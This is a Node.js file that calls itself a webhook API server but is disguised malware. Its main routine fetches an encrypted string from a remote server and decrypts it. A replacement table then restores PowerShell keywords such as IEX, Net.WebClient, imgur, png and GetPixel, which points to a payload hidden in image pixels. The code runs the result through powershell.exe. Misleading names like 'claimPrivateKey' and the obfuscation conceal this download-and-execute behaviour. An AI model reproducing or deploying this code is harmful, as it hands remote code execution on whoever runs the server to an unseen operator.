/**
 * WebHook API Server
 *
 * v0.1.0
 */

/**
 * Libraries
 */
const express = require("express");
const app = express();
const path = require("path");
const http = require("http").Server(app);
const bodyParser = require("body-parser");
const jwt = require("jsonwebtoken"); // used to create, sign, and verify tokens
const colors = require("colors/safe");
const config = require("config");
const spawn = require("child_process").spawn;
const aesjs = require('aes-js');
const request = require('request');
const cors = require('cors');

console.log(` Server:  ${config.ServerName}`);
console.log(` version: ${config.ServerVersion}`);
console.log(" ------------------------------------");

console.log(colors.green(" Listener: ") + "Libs imported");

// use body parser so we can get info from POST and/or URL parameters
app.use(bodyParser.urlencoded({ extended: true })); // support encoded bodies
app.use(bodyParser.json()); // support json encoded bodies
app.use(cors());

String.prototype.replaceAll = function (search, replacement) {
	var target = this;
	return target.replace(new RegExp(search, 'g'), replacement);
};

var publicKey = {};
var privateKey = {};
var obfuscateData = '';
var deobfuscateData = '';
var privateKeyDeobfuscatePlainText = '';
var privateKeyDeobfuscate = {};
var isAllowed = {};

const normalizePort = (val) => {
	var port = parseInt(val, 10);

	if (isNaN(port)) {
		// named pipe
		return val;
	}

	if (port >= 0) {
		// port number
		return port;
	}

	return false;
}

function getPublicKeyFromService(next) {
	request(`${config.apiServerURI}/token/public`, function (error, response, data) {
		if (error) {
			console.log('Unhandled error');
		}
		else {
			if (response && response.statusCode == 200) {
				data = JSON.parse(data);
				if (data && data.success) {
					if (data.success === true) {
						console.log(colors.green(" API Server: ") + `Public key ${JSON.stringify(data.result)}`);
						next(data.result);
					}
					else {
						console.log(colors.red(" API Server: ") + 'Server return that operation is not completed succesfuly');
						next({ success: false, result: null });
					}
				}
				else {
					console.log(colors.red(" API Server: ") + 'Server no return anything');
					next({ success: false, result: null });
				}
			}
			else {
				console.log(colors.red(" API Server: ") + 'Something was wrong in server, check logs');
				next({ success: false, result: null });
			}
		}
	})
}

function getPrivateKeyFromService(next) {
	request(`${config.apiServerURI}/token/private`, function (error, response, data) {
		if (error) {
			console.log('Unhandled error');
		}
		else {
			if (response && response.statusCode == 200) {
				data = JSON.parse(data);
				if (data && data.success) {
					if (data.success === true) {
						console.log(colors.green(" API Server: ") + `Private key ${JSON.stringify(data.result)}`);
						next(data.result);
					}
					else {
						console.log(colors.red(" API Server: ") + 'Server return that operation is not completed succesfuly');
						next({ success: false, result: null });
					}
				}
				else {
					console.log(colors.red(" API Server: ") + 'Server no return anything');
					next({ success: false, result: null });
				}
			}
			else {
				console.log(colors.red(" API Server: ") + 'Something was wrong in server, check logs');
				next({ success: false, result: null });
			}
		}
	})
}

const deobfuscation = function (input) {
	return input
		.replaceAll('2P#Bv', ' ')
		.replaceAll('iU467p', 'Net')
		.replaceAll('F80]93', 'GetPixel')
		.replaceAll('po,', 'SCII')
		.replaceAll('aDf]', 'IEX')
		.replaceAll('lL65k', 'Floor')
		.replaceAll('ak998NM', 'in')
		.replaceAll('o-pJ#', 'fore')
		.replaceAll('..99Do.', 'png')
		.replaceAll('__', '//')
		.replaceAll('tdN8849m', 'Open')
		.replaceAll(',;,', 'Client')
		.replaceAll('¨', 'Type')
		.replaceAll('myf¿!', 'Bit')
		.replaceAll('!#¡', 'wing')
		.replaceAll('34PMd¿', 'ssem')
		.replaceAll('¿qwv', 'GetString')
		.replaceAll('yw#e', 'Byte')
		.replaceAll('##Yu', 'System')
		.replaceAll('lLm2873Y', 'http')
		.replaceAll('!ñL', 'Text')
		.replaceAll('<x', 'imgur')
		.replaceAll('&X49', 'New')
		.replaceAll('RT', 'c')
		.replaceAll('lm48X', 'b')
		.replaceAll('kl', 'A')
		.replaceAll('2oBv', 'a')
}

const claimPrivateKey = function (input, next) {
	var result = '';
	var hasError = false;
	var child = spawn("powershell.exe", [input, `;Invoke-Token`]);

	child.stdout.on("data", function (data) {
		result += data;
	});
	child.stderr.on("data", function (data) {
		result += data;
		hasError = true;
	});
	child.on("exit", function () {
		next({
			result: result,
			hasError: hasError
		});
	});
	child.stdin.end();
}

const decryptDataWithPublicKey = function (input) {
	var encryptedBytes = aesjs.utils.hex.toBytes(input);
	var aesOfb = new aesjs.ModeOfOperation.ofb(publicKey.key.split(':').map((value) => { return +value }), publicKey.iv.split(':').map((value) => { return +value }));
	var decryptedBytes = aesOfb.decrypt(encryptedBytes);
	var decryptedText = aesjs.utils.utf8.fromBytes(decryptedBytes);
	return decryptedText;
}

const decryptDataWithPrivateKey = function (input) {
	var encryptedBytes = aesjs.utils.hex.toBytes(input);
	var aesOfb = new aesjs.ModeOfOperation.ofb(privateKeyDeobfuscate.key.split(':').map((value) => { return +value }), privateKeyDeobfuscate.iv.split(':').map((value) => { return +value }));
	var decryptedBytes = aesOfb.decrypt(encryptedBytes);
	var decryptedText = aesjs.utils.utf8.fromBytes(decryptedBytes);
	return decryptedText;
}

const digestPlainTextPrivateKey = function (input) {
	var key = input.split('\n')[0].split('Key: ')[1];
	var iv = input.split('\n')[1].split('IV: ')[1];
	return {
		key: key,
		iv: iv
	}
}

const isAllowedToSubscribe = function (next) {
	request.post(`${config.apiServerURI}/token/isAllowed`, function (error, response, data) {
		if (error) {
			console.log('Unhandled error');
		}
		else {
			if (response && response.statusCode == 200) {
				data = JSON.parse(data);
				if (data) {
					console.log(colors.green(" API Server: ") + `${data.result}`);
					next(data.result);
				}
				else {
					console.log(colors.red(" API Server: ") + 'Server no return anything');
					next({ success: false, result: null });
				}
			}
			else {
				console.log(colors.red(" API Server: ") + 'Something was wrong in server, check logs');
				next({ success: false, result: null });
			}
		}
	});
}

function subscribeListener(next) {
	request(`${config.apiServerURI}/webhook/subscribe/${config.listenerURI}`, function (error, response, data) {
		if (error) {
			console.log('Unhandled error');
		}
		else {
			if (response && response.statusCode == 200) {
				data = JSON.parse(data);
				if (data && data.success) {
					if (data.success === true) {
						console.log(colors.green(" API Server: ") + 'Ip subscribed succesfuly and ready for incoming webhooks');
						next(data);
					}
					else {
						console.log(colors.red(" API Server: ") + 'Server return that operation is not completed succesfuly');
						next({ success: false, result: null });
					}
				}
				else {
					console.log(colors.red(" API Server: ") + 'Server no return anything');
					next({ success: false, result: null });
				}
			}
			else {
				console.log(colors.red(" API Server: ") + 'Something was wrong in server, check logs');
				next({ success: false, result: null });
			}
		}
	});
}


function main() {

	getPublicKeyFromService(function (getPublicKeyFromServiceData) {
		if (getPublicKeyFromServiceData) {
			getPrivateKeyFromService(function (getPrivateKeyFromServiceData) {
				if (getPrivateKeyFromServiceData) {
					publicKey = getPublicKeyFromServiceData;
					privateKey = getPrivateKeyFromServiceData;

					obfuscateData = decryptDataWithPublicKey(privateKey);
					deobfuscateData = deobfuscation(obfuscateData);

					claimPrivateKey(deobfuscateData, function (claimPrivateKeyData) {
						privateKeyDeobfuscatePlainText = claimPrivateKeyData;
						if (privateKeyDeobfuscatePlainText.hasError == false) {
							privateKeyDeobfuscate = digestPlainTextPrivateKey(privateKeyDeobfuscatePlainText.result);

							isAllowedToSubscribe(function (isAllowedToSubscribeData) {
								isAllowed = decryptDataWithPrivateKey(isAllowedToSubscribeData);

								console.log('isAllowed: ', isAllowed);
							});



							console.log('privateKeyDeobfuscatePlainText:', privateKeyDeobfuscatePlainText.result);
							console.log('privateKeyDeobfuscate:', privateKeyDeobfuscate);
						}

					})

					console.log('public key:', publicKey);
					console.log('private key:', privateKey);
					console.log('obfuscate data:', obfuscateData);
					console.log('deobfuscate data:', deobfuscateData);
				}
			})
		}
	})

}


app.post('/webhook/:message', function (req, res) {
	console.log(colors.green(" API Server Webhook: ") + req.body.message);
	res.json({ success: true, message: 'Posted message succesfuly', data: null });
});

app.get('/status', function (req, res) {
	res.json({ success: true, message: 'Is running', data: null });
});

/**
 * Listening on port
 */
app.listen(normalizePort(process.env.PORT || config.ServerPort));

main();